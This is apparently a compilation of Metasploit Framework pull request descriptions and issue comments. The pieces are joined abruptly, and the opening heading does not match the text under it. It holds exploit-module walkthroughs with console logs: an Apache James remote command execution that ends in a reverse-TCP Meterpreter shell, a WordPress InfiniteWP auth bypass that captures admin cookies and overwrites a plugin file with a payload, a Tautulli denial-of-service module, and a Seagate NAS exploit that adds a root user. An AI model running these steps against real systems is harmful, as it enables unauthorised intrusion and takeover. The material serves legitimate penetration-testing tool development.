Update AF_PACKET chocobo_root Privilege Escalation module

* Uses the new `Msf::Post::Linux::Compile` mixin
* Updates the `chocobo_root.c` C exploit code (and associated pre-compiled executable), which contains new targets for `lowlatency` kernels and some small changes.
* Add notes about cross-compiling to documentation.
* Updates the `check` method to search the C code for target kernel versions, ensuring a 1 to 1 mapping between the Metasploit module and the C exploit.

This module exploits a vulnerability that exists due to a lack of input validation when creating a user in Apache James 2.3.2 (CVE-2015-7611).

## Verification Steps  
  1. Load the module:  
```
  msf5 > use exploit/linux/smtp/apache_james_exec  
```

  2. Set remote and local options:  
```
  msf5 exploit(linux/smtp/apache_james_exec) > set target 1  
  target => 1  
  msf5 exploit(linux/smtp/apache_james_exec) > set rhosts 192.168.224.164  
  rhosts => 192.168.224.164  
  msf5 exploit(linux/smtp/apache_james_exec) > set rport 25  
  rport => 25  

  msf5 exploit(linux/smtp/apache_james_exec) > set lhost 192.168.224.167  
  lhost => 192.168.224.167  
  msf5 exploit(linux/smtp/apache_james_exec) > set lport 4444  
  lport => 4444  
```

  3. Set payload:  
```
  msf5 exploit(linux/smtp/apache_james_exec) > set payload linux/x64/meterpreter/reverse_tcp  
  payload => linux/x64/meterpreter/reverse_tcp  
```

  4. Check version and run exploit:  
```
  msf5 exploit(linux/smtp/apache_james_exec) > check  
  [*] 192.168.224.164:25 - The target appears to be vulnerable.  
  msf5 exploit(linux/smtp/apache_james_exec) > exploit  

  [*] 192.168.224.164:25 - Command Stager progress - 100.00% done (812/812 bytes)  
```

  5. Set up and run listener (Can be done before running exploit):  
```
  msf5 exploit(linux/smtp/apache_james_exec) > use exploit/multi/handler  
  msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp  
  payload => linux/x64/meterpreter/reverse_tcp  
  msf5 exploit(multi/handler) > set lport 4444  
  lport => 4444  
  msf5 exploit(multi/handler) > set lhost 192.168.224.167  
  lhost => 192.168.224.167    

  msf5 exploit(multi/handler) > run  

  [*] Started reverse TCP handler on 192.168.224.167:4444  
  [*] Sending stage (3021284 bytes) to 192.168.224.164  
  [*] Meterpreter session 1 opened (192.168.224.167:4444 -> 192.168.224.164:34752) at 2020-01-18 18:25:14 -0800  

  meterpreter >  
```

## Options  
  **USERNAME:**  The administrator username for Apache James 2.3.2 remote administration tool. By default this is 'root'.  
  **PASSWORD:**  The administrator password for Apache James 2.3.2 remote administration tool. By default this is 'root'.  
  **ADMINPORT:**  The port for Apache James 2.3.2 remote administration tool. By default this is '4555'.  
  **RHOSTS:**  The IP address of the vulnerable server.  
  **RPORT:**  The port number of the SMTP service.  

## Targets
```
  Id  Name 
  --  ----
  0   Linux x86  
  1   Linux x64  
```

## References  
  1. <https://www.exploit-db.com/exploits/35513>  
  2. <https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf>

https://github.com/rapid7/metasploit-framework/commit/4849c6cdf10e256c175958d8bb82536709cb914e#r36863039
Steps to reproduce
Start Metasploit pro with the below command

msfpro

[*] Starting Metasploit Console...
[-] WARNING! The following modules could not be loaded!
[-]     /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.96/modules/payloads/stages/windows/encrypted_shell.rb: NameError uninitialized constant Msf::Payload::Windows::EncryptedPayloadOpts

I have my gems updated!!!

Version=
Framework: 4.17.96-dev                                                                                                                                                                                                                     
Console  : 4.17.96-dev                                                                                                                                                                                                                     
Pro      : 4.16.1-201912090

Distributor ID: Kali
Description:    Kali GNU/Linux Rolling
Release:        2020.1
Codename:       kali-rolling
Kernel: 5.4.0-kali2-amd64 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64 GNU/Linux                                                                                                                                                      


_Originally posted by @space-r7 in https://github.com/rapid7/metasploit-framework/issues/12709#issuecomment-565144764_


Easy afternoon module for a WordPress plugin with somewhere between 300,000 and 500,000 installs. You can read about the bug [here](https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/).

~**To-do:** don't overwrite the plugin file. I tried something and now have to stick with it. :X~ I opted to force retrieving the contents of the file first, then overwriting the file, then restoring the original contents. Prepending the payload to the existing file is too problematic.

This is currently what's overwritten: https://github.com/WordPress/WordPress/blob/master/wp-content/plugins/index.php. It's more or less empty. `hello.php` is another option, unless you really like [Hello, Dolly!](https://www.youtube.com/watch?v=l7N2wssse14)

```
msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > run
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Found version 1.9.4.4 in the custom file
[*] Bypassing auth for admin at http://127.0.0.1:8080/
[+] Successfully obtained cookie for admin
[*] Cookie: wordpress_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7COxBLq33okE0wpLhPExpGTmYwiVFKf9lxPMikSWH9Gzf%7C52db8d17e2e078af4cc32f7c50a36114c2c325c031f3e10dc7bea303c7dba604; wordpress_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7COxBLq33okE0wpLhPExpGTmYwiVFKf9lxPMikSWH9Gzf%7C52db8d17e2e078af4cc32f7c50a36114c2c325c031f3e10dc7bea303c7dba604; wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7COxBLq33okE0wpLhPExpGTmYwiVFKf9lxPMikSWH9Gzf%7C44ecac44335ad633ea98045a7085c4947fee015b700b8b7d9463dd44d2388bb2; wordpress_sec_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7C1h94K6uHKvFtqDB7jrIthpauRgc3eavVak6DVOjAHn3%7C9dfc5a01eb1df39b91ec09823e0b44e9a36490a096f5205dc2209664f689bdc9; wordpress_sec_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7C1h94K6uHKvFtqDB7jrIthpauRgc3eavVak6DVOjAHn3%7C9dfc5a01eb1df39b91ec09823e0b44e9a36490a096f5205dc2209664f689bdc9; wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%7C1579553438%7C1h94K6uHKvFtqDB7jrIthpauRgc3eavVak6DVOjAHn3%7C240d956e7a43f2ed3193171df429c8a8fb9ba3bac2f9805cdf88789f90a186df;
[*] Retrieving original contents of /wp-content/plugins/index.php
[+] Successfully retrieved original contents of /wp-content/plugins/index.php
[*] Contents:
<?php
// Silence is golden.
[*] Overwriting /wp-content/plugins/index.php with payload
[*] Acquired a plugin edit nonce: 9901ed8f55
[*] Edited plugin file index.php
[+] Successfully overwrote /wp-content/plugins/index.php with payload
[*] Requesting payload at /wp-content/plugins/index.php
[*] Restoring original contents of /wp-content/plugins/index.php
[*] Sending stage (38288 bytes) to 192.168.56.1
[*] Acquired a plugin edit nonce: 9901ed8f55
[*] Edited plugin file index.php
[+] Current contents of /wp-content/plugins/index.php match original!
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.1:58534) at 2020-01-18 14:50:39 -0600
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : 4e8791809581
OS          : Linux 4e8791809581 4.9.184-linuxkit #1 SMP Tue Jul 2 22:58:16 UTC 2019 x86_64
Meterpreter : php/linux
meterpreter >
```
Tell us what this change does. If you're fixing a bug, please mention
the github issue number.

## Verification

List the steps needed to make sure this thing works

- [ ] Start `msfconsole`
- [ ] `use auxiliary/dos/http/tautulli_shutdown_exec`
- [ ] `set RHOSTS XXX.XXX.XXX.XXX`
- [ ] `run`

## PoC

![72550314-80cd8a00-38a3-11ea-9bad-942668a29390](https://user-images.githubusercontent.com/15425071/72602337-29bdc880-3928-11ea-8aec-ddadb3ff4f2d.png)
Adding documentation for auxiliary/scanner/oracle/oracle_login. First PR, so please let me know how I can improve! Issue #12389


https://github.com/rapid7/metasploit-framework/issues/12765#issuecomment-570024351

> 
> 
> Now another error
> 
> msf5 > openvas_report_list
> /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/openvas-omp-0.0.4/lib/openvas-omp.rb:201: warning: Object#timeout is deprecated, use Timeout.timeout instead.
> [-] OpenVAS OMP: Error in OMP request/response
> 
> P.S. Sorry for the wait.


Tentatively assigning this one to myself, pending release of the PoC:

https://duasynt.com/blog/ubuntu-centos-redhat-privesc


Bonjour again :hand:

This module exploits the broken access control vulnerability (CVE-2020-6627) of Seagate Central Storage NAS product and adds a new system user. An unauthenticated user can access the NAS device via adding a new system user with root privileges.

## Verification

List the steps needed to make sure this thing works

- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/seagate_central_ssh_user_add`
- [ ] Set `RHOST`
- [ ] Set `RPORT`
- [ ] Run `exploit`
- [ ] **Verify** that you are seeing `State successfully changed !`
- [ ] **Verify** that you are seeing `User: ...` and `Pass: ...`
- [ ] **Verify** that you are getting SSH session.

**Technical Details and MSF Module in Asciinema**
[https://pentest.blog/advisory-seagate-central-storage-remote-code-execution/](https://pentest.blog/advisory-seagate-central-storage-remote-code-execution/)
